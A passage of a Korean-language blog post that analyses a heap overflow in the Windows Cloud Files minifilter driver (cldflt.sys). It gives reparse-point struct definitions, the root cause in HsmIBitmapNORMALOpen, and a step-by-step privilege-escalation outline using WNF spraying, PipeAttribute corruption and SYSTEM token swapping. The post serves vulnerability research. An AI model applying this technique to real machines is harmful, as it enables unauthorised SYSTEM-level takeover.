&#xC704;&#xC784;&#xD574;&#xBC84;&#xB9AC;&#xB294;&#xB370;&#xC694;. &#xC704;&#xC5D0;&#xC11C; &#xBCF4;&#xC558;&#xB358; Minifilter&#xC774; I/O Interpreter &#xC5ED;&#xD560;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130; &#xC870;&#xC791;&#xC740; User-Mode &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xB2F4;&#xB2F9;&#xD55C;&#xB2E4;&#xB294; &#xAC1C;&#xB150;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xC8E0;? (&#xC624;.. &#xC2E0;&#xAE30;&#xD558;&#xB124;&#xC694;.)</p><p>Windows Cloud Files Minifilter&#xC758; Reparse Point &#xAD6C;&#xC870;&#xCCB4;&#xB97C; Local Types&#xC5D0; &#xCD94;&#xAC00;&#xD588;&#xB294;&#xB370;&#xC694;, &#xC81C;&#xAC00; &#xC815;&#xC758;&#xD55C; CldFlt &#xAD6C;&#xC870;&#xCCB4; &#xC138;&#xD2B8;&#xB97C; &#xD568;&#xAED8; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">REPARSE_DATA_BUFFER</span> {</span>    DWORD ReparseTag;    WORD ReparseDataLength;    WORD Reserved;    WORD Flags;    WORD UncompressedSize;    REPARSE_CLD_BUFFER ReparseCldBuffer;} REPARSE_DATA_BUFFER, *PREPARSE_DATA_BUFFER;</code></pre><p>&#xBA3C;&#xC800; <code>REPARSE_DATA_BUFFER</code>&#xB294; NTFS&#xC758; &#xBAA8;&#xB4E0; Reparse Point &#xB370;&#xC774;&#xD130;&#xB97C; &#xD45C;&#xD604;&#xD558;&#xB294; &#xD45C;&#xC900; &#xD5E4;&#xB354; &#xAD6C;&#xC870;&#xCCB4;&#xC774;&#xC9C0;&#xB9CC;, &#xC5EC;&#xAE30;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xAD6C;&#xC870;&#xCCB4;&#xB294; Cloud Files&#xB97C; &#xC27D;&#xAC8C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC7AC;&#xC815;&#xC758;&#xD55C; &#xBC84;&#xC804;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xAD6C;&#xC870;&#xCCB4;&#xB294; <code>ReparseTag</code>&#xB85C; &#xC18C;&#xC720; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; <code>ReparseDataLength</code>, <code>Flags</code> &#xAC19;&#xC740; &#xCD5C;&#xC0C1;&#xC704; &#xBA54;&#xD0C0;&#xC815;&#xBCF4;&#xB97C; &#xB2F4;&#xC73C;&#xBA70;, &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xB294; <code>HSM_REPARSE</code>&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_REPARSE</span></span><span class="hljs-class">{</span>    USHORT hsmFlags;    USHORT hsmSize;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> <span class="hljs-title">fileData</span>;</span>};</code></pre><p><code>HSM_REPARSE</code>&#xB294; Cloud Files &#xC804;&#xC6A9; Reparse Point &#xC804;&#xCCB4; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC785;&#xB2C8;&#xB2E4;. <code>hsmFlags</code>&#xC640; <code>hsmSize</code>&#xB85C; &#xC555;&#xCD95; &#xC5EC;&#xBD80;&#xC640; HSM &#xBE14;&#xB85D; &#xC804;&#xCCB4; &#xD06C;&#xAE30;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xACE0;, <code>fileData</code> &#xD544;&#xB4DC;&#xC5D0; <code>HSM_RP_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_DATA</span> </span><span class="hljs-class">{</span>           ULONG magic;    ULONG crc32;    ULONG totalSize;    USHORT dataFlags;    USHORT elemCount;    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> <span class="hljs-title">elements</span>[5];</span>};</code></pre><p>&#xC774;&#xC5B4;&#xC11C; <code>HSM_RP_DATA</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xBA54;&#xC778; &#xD5E4;&#xB354;&#xB85C;, &#xC804;&#xCCB4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC758; &#xAD6C;&#xC870;&#xC640; &#xC704;&#xCE58;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. magic&#xC744; &#xD1B5;&#xD574; &#xB370;&#xC774;&#xD130; &#xC885;&#xB958;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0;, crc32&#xB97C; &#xD1B5;&#xD574; <code>dataFlags</code>&#xC5D0; CRC &#xC874;&#xC7AC; &#xBE44;&#xD2B8;&#xAC00; &#xC124;&#xC815;&#xB418;&#xBA74; <code>RtlComputeCrc32</code>&#xB85C; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;. elements[] &#xBC30;&#xC5F4;&#xC5D0;&#xB294; <code>HSM_RP_ELEMENT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xAC01; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xC758; &#xC720;&#xD615;, &#xD06C;&#xAE30;, &#xC624;&#xD504;&#xC14B;&#xC744; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HSM_RP_ELEMENT</span> </span><span class="hljs-class">{</span>                   USHORT elemType;    USHORT elemSize;    ULONG elemOffset;};<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> HSM_RP_ELEM_TYPE {    HSM_RP_ELEMENT_NONE   = <span class="hljs-number">0x00</span>,    HSM_RP_ELEMENT_U64    = <span class="hljs-number">0x06</span>,    HSM_RP_ELEMENT_BYTE   = <span class="hljs-number">0x07</span>,    HSM_RP_ELEMENT_U32    = <span class="hljs-number">0x0a</span>,    HSM_RP_ELEMENT_BITMAP = <span class="hljs-number">0x11</span>,    HSM_RP_ELEMENT_MAX    = <span class="hljs-number">0x12</span>} HSM_RP_ELEMENT_TYPE;</code></pre><p>&#xC774;&#xD6C4; <code>HSM_RP_ELEMENT</code>&#xC5D0;&#xC11C;&#xB294; &#xAC1C;&#xBCC4; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xC694;&#xC18C;&#xC758; type, size, offset&#xC744; &#xC815;&#xC758;&#xD558;&#xBA70;, <code>HSM_RP_ELEMENT_TYPE</code> &#xAC12;&#xC73C;&#xB85C; &#xC720;&#xD615;&#xC744; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xC591;&#xC0C1;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-1-Root-Cause-Analysis"><a href="#2-1-Root-Cause-Analysis" class="headerlink" title="2.1 Root Cause Analysis"></a>2.1 Root Cause Analysis</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image5.png" alt></p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD574; <code>HsmFltPostCREATE</code> &#xCF5C;&#xBC31;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; Reparse Point&#xB97C; &#xCC98;&#xB9AC;&#xD560; &#xB54C;,  <code>HsmFltPostCREATE</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; Reparse Point&#xC5D0; &#xB2F4;&#xAE34; bitmap &#xC815;&#xBCF4;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xAE30; &#xC704;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>bitmap_size</code>&#xB294; User-Mode &#xC694;&#xCCAD; &#xBC84;&#xD37C;&#xC5D0;&#xC11C; &#xC77D;&#xC5B4;&#xC628; &#xAC12;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xD06C;&#xAE30; 0x1000&#xC73C;&#xB85C; &#xACE0;&#xC815; &#xD560;&#xB2F9;&#xD55C; &#xBC84;&#xD37C; <code>ExAllocatePoolWithTag</code>&#xC5D0; &#xB300;&#xD574;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; <code>bitmap_size</code>&#xB97C; &#xACBD;&#xACC4; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xADF8;&#xB300;&#xB85C; <code>memmove</code>&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xC5EC; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><p>&#xB530;&#xB77C;&#xC11C; &#xB9CC;&#xC57D; <code>bitmap_size</code> &gt; 0x1000&#xC778; &#xACBD;&#xC6B0;, Heap-based Buffer Overflow&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB420; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image6.png" alt></p><p><code>HsmpBitmapIsReparseBufferSupported()</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>hdr-&gt;elements[4].elemSize</code> &#xAC12;&#xC774; 0x1000&#xBCF4;&#xB2E4; &#xD06C;&#xBA74; &#xC624;&#xB958;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294;&#xB370;&#xC694;. </p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image7.png" alt></p><p>&#xC870;&#xAE08; &#xB354; &#xC704;&#xB85C; &#xC62C;&#xB77C;&#xAC00;&#xC11C; &#xC870;&#xAC74;&#xBB38; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>hdr-&gt;elements[2]</code>&#xB97C; &#xC5C4;&#xACA9;&#xD558;&#xAC8C; &#xAC80;&#xC99D;&#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>total &#x2265; 0x18</code>, <code>hdr&#x2192;elemCount</code> &#xB4F1;&#xC758; &#xACBD;&#xACC4; &#xCCB4;&#xD06C;&#xB97C; &#xBAA8;&#xB450; &#xD1B5;&#xACFC;&#xD574;&#xC57C; &#xC9C4;&#xD589;&#xC774; &#xB418;&#xB294;&#xAD70;&#xC694;.. &#xC774; &#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xBA74; fail&#xC744; &#xBC18;&#xD658;&#xD558;&#xACA0;&#xC8E0;?</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image8.png" alt></p><p>&#xADF8;&#xB7F0;&#xB370; &#xB3D9;&#xC77C; &#xD568;&#xC218;&#xC5D0; <code>hasBuf</code>&#xAC00; false&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74;, &#xBCC4;&#xB3C4;&#xC758; &#xBE44;&#xD2B8;&#xB9F5; &#xAE38;&#xC774; &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xACE0; <code>element[1]</code>&#xC758; 1&#xBC14;&#xC774;&#xD2B8; &#xD50C;&#xB798;&#xADF8;&#xB9CC; &#xD655;&#xC778;&#xD574;&#xB3C4; result = 0&#xC73C;&#xB85C; success&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACBD;&#xB85C;&#xC5D0;&#xC11C;&#xB294; &#xBE44;&#xD2B8;&#xB9F5;&#xC758; &#xAE38;&#xC774;&#xAC00; 0x1000&#xBCF4;&#xB2E4; &#xD070;&#xC9C0; &#xAC80;&#xC0AC;&#xAC00; &#xC218;&#xD589;&#xB418;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAC80;&#xC99D;&#xC774; &#xAC74;&#xB108;&#xB6F0;&#xC5B4;&#xC9C0;&#xBA74;&#xC11C; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC720;&#xD6A8;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</p><h2 id="2-2-Exploit"><a href="#2-2-Exploit" class="headerlink" title="2.2 Exploit"></a>2.2 Exploit</h2><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image9.png" alt></p><p>cldflt.sys &#xBBF8;&#xB2C8;&#xD544;&#xD130; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBAA8;&#xB4E0; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C; I/O&#xB97C; &#xD6D1;&#xB294;&#xAC8C; &#xC544;&#xB2C8;&#xB77C;, CfAPI&#xB97C; &#xD1B5;&#xD55C; Sync Root &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB9CC; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xBA3C;&#xC800; <code>CfRegisterSyncRoot()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xB3D9;&#xAE30;&#xD654; &#xD3F4;&#xB354;&#xC758; Root &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image10.png" alt></p><p>Sync Root&#xB97C; &#xB4F1;&#xB85D;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC6B0;&#xC120; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD574;&#xBCF4;&#xBA74; &#xC774;&#xB7F0; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xAE30;&#xB294;&#xB370;&#xC694;. &#xC774; &#xD3F4;&#xB354; &#xB0B4;&#xBD80;&#xC5D0;&#xB294; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; Stub File, &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130;&#xAC00; &#xC0DD;&#xAE38; &#xC218; &#xC788;&#xACE0;, &#xC81C;&#xAC00; &#xC774;&#xAC78; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xC9C0;&#xC810;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">-&gt; HsmFltPostCREATE()-&gt; HsmiFltPostECPCREATE()-&gt; HsmpSetupContexts()-&gt; HsmpCtxCreateStreamContext()-&gt; HsmIBitmapNORMALOpen()</code></pre><p>&#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF8; &#xACB0;&#xACFC;, &#xCDE8;&#xC57D;&#xD55C; &#xD568;&#xC218;&#xC778; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xB85C; &#xC9C4;&#xC785;&#xD558;&#xB824;&#xBA74; &#xC704;&#xC640; &#xAC19;&#xC740; &#xD568;&#xC218; &#xCCB4;&#xC778;&#xC744; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD1B5;&#xACFC;&#xD558;&#xBA74;&#xC11C; &#xC870;&#xAC74;&#xBB38;&#xC744; &#xBAA8;&#xB450; &#xCDA9;&#xC871;&#xD574;&#xC57C; &#xC9C4;&#xC785;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xC800;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xC870;&#xAC74;&#xC744; &#xBAA8;&#xB450; &#xCDA9;&#xC871;&#xD574;&#xC11C; <code>HsmIBitmapNORMALOpen()</code> &#xD568;&#xC218;&#xC758; &#xCDE8;&#xC57D;&#xD55C; <code>memmove</code>&#xC5D0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. </p><blockquote><p><strong>Minifilter Driver&#xB85C;&#xC11C;&#xC758; &#xD750;&#xB984; &#xC774;&#xD574;</strong></p></blockquote><p>&#xC55E;&#xC11C; Minifilter &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; I/O &#xC694;&#xCCAD;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC744; &#xB54C; IRP &#xCF54;&#xB4DC;&#xBCC4;&#xB85C; Callback&#xC744; &#xD638;&#xCD9C;&#xD55C;&#xB2E4;&#xACE0; &#xD588;&#xC8E0;? &#xCDE8;&#xC57D;&#xC810; &#xACBD;&#xB85C;&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; <code>IRP_MJ_CREATE</code>&#xC758; <code>Post-Create Callback</code>(<code>HsmFltPostCREATE</code>)&#xB97C; &#xC2DC;&#xC791;&#xC73C;&#xB85C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; &#xD568;&#xC218;&#xC5D0; &#xB3C4;&#xB2EC;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC911;&#xAC04; &#xD568;&#xC218;&#xB4E4;&#xC740; &#xD30C;&#xC77C;/&#xC2A4;&#xD2B8;&#xB9BC; &#xC18D;&#xC131;&#xACFC; Reparse Point &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC9C4;&#xC785; &#xC870;&#xAC74;&#xC744; &#xAC80;&#xC99D;&#xD558;&#xBBC0;&#xB85C;, &#xC800;&#xD76C;&#xB294; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xD2B9;&#xC218;&#xD55C; &#xD30C;&#xC77C; &#xAD6C;&#xC870;&#xB97C; &#xB9CC;&#xB4E4;&#xBA74; &#xB418;&#xB294; &#xAC81;&#xB2C8;&#xB2E4;!</p><ol><li><code>MakeDataBuffer()</code>&#xB85C; <code>IO_REPARSE_TAG_CLOUD</code> &#xAD6C;&#xC870; &#xC0DD;&#xC131; &#x2192; Minifilter&#xAC00; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; Cloud Stub File&#xB85C; &#xC778;&#xC2DD;&#xD574; Reparse Point &#xD30C;&#xC2F1; &#xB85C;&#xC9C1; &#xC9C4;&#xC785;.</li><li>Item Tag = <code>0x11</code>(Bitmap) &#x2192; <code>Size</code>&#xB97C; <code>0x1000 + overSize</code>&#xB85C; &#xC124;&#xC815;&#xD574; <code>memmove()</code>&#xC5D0;&#xC11C; &#xD560;&#xB2F9; &#xD06C;&#xAE30;&#xB97C; &#xCD08;&#xACFC;&#xD55C; &#xBCF5;&#xC0AC;(Heap Overflow) &#xC720;&#xBC1C;. &#xB2E4;&#xB978; &#xC694;&#xC18C;&#xB4E4;(Tag <code>0x7</code>, <code>0x6</code>, <code>0xA</code> &#xB4F1;)&#xB3C4; Minifilter&#xC758; &#xACBD;&#xACC4; &#xCCB4;&#xD06C;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xB3C4;&#xB85D; &#xAC12; &#xC124;&#xC815;.</li><li>Overflow &#xB370;&#xC774;&#xD130;&#xC5D0; Fake &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130; &#xD3EC;&#xD568; &#x2192; <code>FSCTL_SET_REPARSE_POINT</code>&#xB85C; &#xC801;&#xC6A9; &#xD6C4; <code>CreateFile()</code> &#xD638;&#xCD9C; &#xC2DC; <code>HsmIBitmapNORMALOpen()</code> &#xC9C4;&#xC785;</li></ol><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image11.png" alt></p><p>&#xC870;&#xAC74;&#xC744; &#xCDA9;&#xC871;&#xD558;&#xBA74; FltMgr&#xB85C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD574; <code>HsmIBitmapNORMALOpen()</code>&#xC5D0; &#xC9C4;&#xC785;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>Exploit &#xACFC;&#xC815;&#xC744; &#xC804;&#xBD80; &#xB2F4;&#xACE0;&#xC2F6;&#xC9C0;&#xB9CC; &#xC624;&#xB298;&#xC740; Minifilter &#xC124;&#xBA85; &#xAE00;&#xC774;&#xACE0; &#xBC8C;&#xC368; &#xBD84;&#xB7C9; &#xC870;&#xC808;&#xC5D0; &#xC2E4;&#xD328;&#xD574;&#xBC84;&#xB9B0; &#xAC83; &#xAC19;&#xC73C;&#xB2C8;.. &#xC804;&#xCCB4; exploit &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xB97C; &#xD55C;&#xBC88; &#xC694;&#xC57D;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/15/banda/Minifilter-Driver/ko/image12.png" alt></p><blockquote><p><strong>Proof of Concept Overview</strong></p></blockquote><ol><li><strong>EPROCESS &#xAD6C;&#xC870; &#xBD84;&#xC11D; &#xBC0F; Token &#xD544;&#xB4DC; Offset &#xACC4;&#xC0B0;</strong><br>EPROCESS &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; Token &#xD544;&#xB4DC;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD574; &#xC774;&#xD6C4; SYSTEM Token swap &#xC900;&#xBE44;.</li><li><strong>&#xCCAB; &#xBC88;&#xC9F8; <code>WNF_STATE_DATA</code> Spray &#xBC0F; Hole &#xC0DD;&#xC131;</strong><br>0x1000 &#xD06C;&#xAE30;(0xff0 &#xB370;&#xC774;&#xD130;)&#xC758; <code>WNF_STATE_DATA</code> &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xB300;&#xB7C9;&#xC73C;&#xB85C; &#xC0DD;&#xC131;(spray)&#xD558;&#xACE0;, &#xD574;&#xC81C;&#xD574; &#xCEE4;&#xB110; &#xD799;&#xC5D0; Heap Hole &#xC0DD;&#xC131;.</li><li><strong>&#xCDE8;&#xC57D;&#xD55C; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C; &#xC624;&#xD508; &#xBC0F; &#xCCAB; &#xBC88;&#xC9F8; Overflow &#xD2B8;&#xB9AC;&#xAC70;</strong><br><code>CfRegisterSyncRoot()</code>&#xC640; Reparse Point &#xB514;&#xB809;&#xD130;&#xB9AC; &#xC870;&#xC791;&#xC744; &#xD1B5;&#xD574; Sync Root &#xB0B4;&#xBD80;&#xC758; &#xCDE8;&#xC57D;&#xD55C; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C;&#xC744; &#xC900;&#xBE44;. &#xC774;&#xD6C4; <code>CreateFile()</code>&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; <code>IRP_MJ_CREATE()</code> &#x2192; <code>HsmFltPostCREATE()</code> &#x2192; <code>HsmiFltPostECPCREATE()</code> &#x2192; <code>HsmpSetupContexts()</code> &#x2192; <code>HsmpCtxCreateStreamContext()</code> &#x2192; <code>HsmIBitmapNORMALOpen()</code> &#xACBD;&#xB85C;&#xAE4C;&#xC9C0; &#xC9C4;&#xC785;&#xD558;&#xACE0;, Heap Overflow&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC811;&#xD55C; <code>WNF_STATE_DATA</code>&#xC758; DataSize&#xB97C; &#xBCC0;&#xC870;&#xD574; OOB R/W&#xB97C; &#xD655;&#xBCF4;.</li><li><strong>&#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130; Leak</strong><br>&#xBCC0;&#xC870;&#xB41C; <code>WNF_STATE_DATA</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>_KALPC_RESERVE</code> **&#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC77D;&#xC5B4; &#xCEE4;&#xB110; &#xC8FC;&#xC18C; Leak.</li><li><strong>&#xB450; &#xBC88;&#xC9F8; <code>WNF_STATE_DATA</code> Spray &#xBC0F; Hole &#xC0DD;&#xC131;</strong><br>&#xB2E4;&#xC2DC; &#xB3D9;&#xC77C; &#xD06C;&#xAE30;&#xC758; <code>WNF_STATE_DATA</code>&#xB97C; Spray&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD574; Hole&#xC744; &#xB9CC;&#xB4E0; &#xD6C4;, &#xC774;&#xBC88;&#xC5D0;&#xB294; <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xC640; &#xC778;&#xC811;&#xD55C; &#xC601;&#xC5ED;&#xC5D0; WNF &#xAC1D;&#xCCB4;&#xAC00; &#xBC30;&#xCE58;&#xB418;&#xB3C4;&#xB85D; &#xAD6C;&#xC131;.</li><li><strong>&#xB450; &#xBC88;&#xC9F8; Overflow&#xB97C; &#xD1B5;&#xD574; <code>PipeAttribute</code> &#xC870;&#xC791;</strong><br>&#xB450; &#xBC88;&#xC9F8; &#xBE44;&#xD2B8;&#xB9F5; &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xC5B4; Heap Overflow&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xACE0;, &#xC778;&#xC811;&#xD55C; <code>PipeAttribute</code>&#xC758; <code>Flink</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xC790; &#xACF5;&#xAC04; Fake <code>PipeAttribute</code> &#xAD6C;&#xC870;&#xCCB4; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC74C;.</li><li><strong>Arbitrary Read &#xAD6C;&#xC131; &#xBC0F; EPROCESS/Token &#xC8FC;&#xC18C; &#xD68D;&#xB4DD;</strong><br>Fake <code>PipeAttribute</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; ALPC Port &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xB300;&#xC0C1; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; EPROCESS &#xC8FC;&#xC18C;&#xC640; Token &#xC8FC;&#xC18C;&#xB97C; &#xC21C;&#xCC28;&#xC801;&#xC73C;&#xB85C; read.</li><li><strong>Token Swapping &#xBC0F; SYSTEM &#xAD8C;&#xD55C; &#xD68D;&#xB4DD;</strong><br>Arbitrary Write&#xB97C; &#xD1B5;&#xD574; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; Token &#xAC12;&#xC744; SYSTEM Token &#xAC12;&#xC73C;&#xB85C; &#xAD50;&#xCCB4;&#xD558;&#xACE0;, SYSTEM &#xAD8C;&#xD55C;&#xC758; <code>cmd.exe</code>&#xB97C; &#xC2E4;&#xD589;.</li></ol><h3 id="ALPC-WNF"><a href="#ALPC-WNF" class="headerlink" title="ALPC/WNF"></a>ALPC/WNF</h3><p><code>_WNF_STATE_DATA</code>&#xC640; <code>_ALPC_HANDLE_TABLE</code> &#xAD6C;&#xC870;&#xCCB4;&#xB97C; &#xC774;&#xC6A9;&#xD574; Heap Hole&#xC744; &#xC704;&#xD55C; Arbitrary size &#xCEE4;&#xB110; &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0;, &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; leak&#xD558;&#xAC8C; &#xB418;&#xB294;&#xB370;&#xC694;. &#xC544;&#xB9C8;&#xB3C4; ALPC&#xC640; WNF &#xAC1C;&#xB150;&#xC774; 